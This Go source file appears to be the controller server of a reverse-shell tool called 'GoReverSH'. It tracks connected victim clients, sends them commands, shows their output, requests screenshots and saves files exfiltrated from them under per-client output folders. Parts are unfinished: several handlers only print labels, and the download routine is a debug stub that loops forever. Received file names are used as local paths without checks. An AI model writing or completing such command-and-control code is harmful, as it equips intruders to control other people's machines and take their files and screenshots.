package server

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

type Observer struct {
	Sender         Sender
	State          State
	Subject        <-chan Notification
	PromptViewFlag bool
	Lock           *sync.Mutex
}

//受け取った通知の種別によってメッセージの送信, あるいはメンバーの追加/削除を行います
func (observer Observer) WaitNotice(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			notice := <-observer.Subject
			switch notice.Type {
			case JOIN:
				observer.State.ClientMap[notice.Client.Name] = notice.Client
				if observer.Sender.connectingClient == nil {
					observer.Sender.connectingClient = notice.Client
				}
				observer.printPrompt()

			case DEFECT:
				fmt.Println("Connection Close")
				notice.Client.Conn.Close()
				delete(observer.State.ClientMap, notice.Client.Name)
				if 0 < len(observer.State.ClientMap) {
					for _, c := range observer.State.ClientMap {
						observer.Sender.connectingClient = c
						break
					}
				}
				observer.printPrompt()

			case COMMAND:
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case MESSAGE:
				fmt.Printf("\n%s\n", notice.Output.Message)
				observer.printPrompt()

				//30
			case UPLOAD:
				fmt.Println("UPLOAD")
				observer.printPrompt()

				//29
			case DOWNLOAD:
				fmt.Println("DOWNLOAD")
				observer.printPrompt()

				//28
			case SCREEN_SHOT:
				fmt.Println("SCREENSHOT")
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case CREATE_FILE:
				filePath := strings.Split(notice.Output.FileInfo.Name, "/")
				lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
				outdir := "./output/" + notice.Client.Name + "/" //config

				//dir作成
				if _, err := os.Stat(outdir + lastPathFromRecievedFile); os.IsNotExist(err) {
					if err2 := os.MkdirAll(outdir+lastPathFromRecievedFile, 0755); err2 != nil {
						log.Fatalf("Could not create the path %s", outdir+lastPathFromRecievedFile)
					}
				}

				f, err := os.Create(outdir + notice.Output.FileInfo.Name)
				if err != nil {
					log.Println(err)
					continue
				}
				f.WriteString(string(notice.Output.FileInfo.Body))
				f.Close()
				observer.printPrompt()

			case MAKE_DIR:
				fmt.Println("make dir")
				observer.printPrompt()

				//30
			case CLEAN:
				fmt.Println("CLEAN")
				observer.printPrompt()

			default:
				log.Println(notice)
			}
		}
	}
}

func (o Observer) printPrompt() {
	if o.Sender.connectingClient != nil {
		fmt.Printf("\n[GoReverSH@%s] >", o.Sender.connectingClient.Name)
	} else {
		fmt.Println("wait...")
	}
}

//先にサイズを受け取る
//サイズ分のバッファを確保
//読み込む
//バッファ分読み込んだら、次のファイル
//サイズ0、名前空、中身なしの場合終了
func downloadFiles(conn net.Conn) error {
	for {
		fmt.Println(1)
		bufferFileName := make([]byte, 64)
		bufferFileSize := make([]byte, 10)
		conn.Read(bufferFileSize)
		fmt.Println(string(bufferFileSize))
		fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)

		if fileSize == 0 {
			//break
		}

		fmt.Println(2)
		conn.Read(bufferFileName)
		fileName := strings.Trim(string(bufferFileName), ":")

		fmt.Println(fileName, fileSize)
		/*
			fileInfoBuff := make([]byte, 1024)
			fmt.Println(1)
			n, err := conn.Read(fileInfoBuff)
			fmt.Println(1)
			fmt.Println(1)
			output := utils.Output{}
			fmt.Println(n)
			if err != nil {
				log.Fatalln(err)
				break
			}

			fmt.Println(2)
			data := strings.Trim(string(fileInfoBuff[:n]), ":")

			//err := json.NewDecoder(conn).Decode(&output)
			fmt.Println("data:", string(data))
			err = json.Unmarshal([]byte(data), &output)
			if err != nil {
				log.Fatalln(err)
				break
			}
			fmt.Println(output)

			if output.Type == utils.FIN {
				break
			}

			fmt.Println(3)
		*/

		/*
			//TODO 出力フォルダは設定ファイルに記載
			outdir := "./output/"
			f, err := os.Create(outdir + output.FileInfo.Name)
			if err != nil {
				log.Fatalln(err)
				break
			}

			fmt.Println(4)

			var content []byte
			buff := make([]byte, 1024)
			size := 0

			for int64(size) < output.FileInfo.Size {
				n, err := conn.Read(buff)
				if err != nil {
					break
				}
				tmp := make([]byte, 0, size+n)
				tmp = append(content[:size], buff[:n]...)
				content = tmp
				size += n
			}
		*/

		//fileInfoのWriteが消されてしまう
		/*
			_, err = io.Copy(f, conn)
			if err != nil {
				break
			}
		*/
		fmt.Println(4)

		//f.Close()
		fmt.Println("Close")
	}
	return nil
}
